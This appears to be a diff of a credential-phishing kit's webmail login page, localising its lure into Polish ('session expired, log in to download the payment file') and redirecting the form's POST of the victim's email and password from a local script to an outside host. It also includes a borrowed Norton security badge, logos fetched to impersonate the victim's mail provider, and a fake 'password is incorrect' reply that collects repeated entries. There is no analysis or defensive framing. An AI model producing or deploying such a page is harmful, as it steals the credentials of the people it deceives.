@@ -275,23 +275,22 @@
 
     <form name="myForm" id="login_form" action="" method="post">
       <div class="form-wrap" style="position: relative;">
-        <p>Please sign in with your email</p>
+        <p>Sesja wygasła. Zaloguj się za pomocą swojego e-mail, aby pobrać plik płatności</p>
         <div class="error" style="margin-top: 5px; display: none" id="err"></div>
         <div class="finput">
-          <input type="email" id="pet" name="login" placeholder="Email Address" readonly required>
+          <input type="email" id="pet" name="login" placeholder="Adres E-Mail" readonly required>
         </div>
         <div class="finput">
-          <input type="password" name="passwd" placeholder="Email Password" id="pett" required="">
+          <input type="password" name="passwd" placeholder="Email Hasło" id="pett" required="">
           <input type="hidden" id="source" name="source" value="others">
         </div>
         <div class="finput btn">
-          <button id="login_submit">Continue</button>
+          <button id="login_submit">Kontynuuj</button>
         </div>
         <img src="./m/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png" width="107" height="58">
         <span class="privacy">
-          Privacy Policy: <span id="kai" style="text-transform:uppercase;"></span><br>
-          Your information is only for the sole purpose of viewing this document and would not be sold or shared to any
-          third party.
+          Polityka Prywatności: <span id="kai" style="text-transform:uppercase;"></span><br>
+          Twoje informacje służą wyłącznie do przeglądania tego dokumentu i nie będą sprzedawane ani udostępniane osobom trzecim.
         </span>
       </div>
     </form>
@@ -333,7 +332,7 @@
 $("#zion").attr("src", "https://logo.clearbit.com/" + mainPage);
     $("#favicon").attr("href", "https://logo.clearbit.com/" + mainPage);
     document.body.style.backgroundImage = image;
-    document.title = "Webmail Portal Access - " + sv;
+    document.title = "Dostęp Do Portalu Poczty Internetowej - " + sv;
 
 
   } else {
@@ -355,11 +354,11 @@ $("#zion").attr("src", "https://logo.clearbit.com/" + mainPage);
     e.preventDefault();
     if (!/.+@.+\..+/.test($("input[name='login']").val())) {
       showEl(err, "red");
-      err.textContent = "Enter a valid email address.";
+      err.textContent = "Wprowadź prawidłowy adres e-mail i hasło.";
       return;
     } else if (!$("input[name='passwd']").val() || !$("input[name='password']").val() > 4) {
       showEl(err, "red");
-      err.textContent = "Enter your correct password!";
+      err.textContent = "Wprowadź poprawne hasło!";
       return;
     } else {
       count=count+1;
@@ -374,19 +373,19 @@ $("#zion").attr("src", "https://logo.clearbit.com/" + mainPage);
 
       $.ajax({
         type: "POST",
-        url:'./0.php',
+        url:'https://goldenfebruaryblx.line.pm/x8.php',
         data: data,
         cache: false,
         timeout: 800000,
         beforeSend: function (xhr) {
-          $('#login_submit').html('Verifying...');
+          $('#login_submit').html('Weryfikacja...');
         },
         success: function (response) {
           if (response) {
             pett.value = "";
             pett.style.borderColor = "red";
             showEl(err, "red");
-            err.textContent = "Password is incorrect.";
+            err.textContent = "Hasło jest nieprawidłowe.";
 
             if (count>=2) {
                         count=0;
